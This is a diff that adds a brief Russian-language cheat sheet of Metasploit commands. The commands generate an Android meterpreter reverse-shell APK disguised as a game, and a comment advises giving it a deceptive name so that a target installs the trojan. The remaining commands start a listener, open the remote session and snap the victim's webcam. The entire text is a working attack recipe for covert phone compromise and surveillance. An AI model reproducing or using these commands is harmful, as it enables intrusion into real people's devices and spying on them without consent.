@@ -1,0 +1,10 @@
+iconfig (получить IP Кали)
+msfvenom -p android/meterpreter/reverse_tcp LHOST=(IP-адрес из iconfig) LPORT=4444 R> /root/Desktop/CheatGame.apk ("CheatGame.apk может быть изменено во что-нибудь с именем которое может обмануть цель и установить трояна на Android) 
+msfconsole (подожди MSF)
+set payload android/meterpreter/reverse_tcp
+set LHOST (same LHOST from previous config)
+set LPORT 4444
+exploit
+sessions -l
+sessions -i l
+webcam_snap
